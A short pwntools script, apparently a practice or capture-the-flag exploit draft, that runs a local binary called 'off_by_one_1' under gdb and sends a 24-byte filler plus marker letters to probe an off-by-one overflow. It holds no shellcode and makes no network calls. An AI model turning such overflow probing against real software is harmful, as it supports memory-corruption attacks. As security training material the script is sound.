from pwn import *
io = process('./off_by_one_1')
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(io, 'b main')
payload = 'a'*24 + 'b' + 'c' + 'd' + 'e' + 'f' + 'g' + 'h' + 'i' + 'j'
io.sendlineafter('Input', payload)
io.interactive()
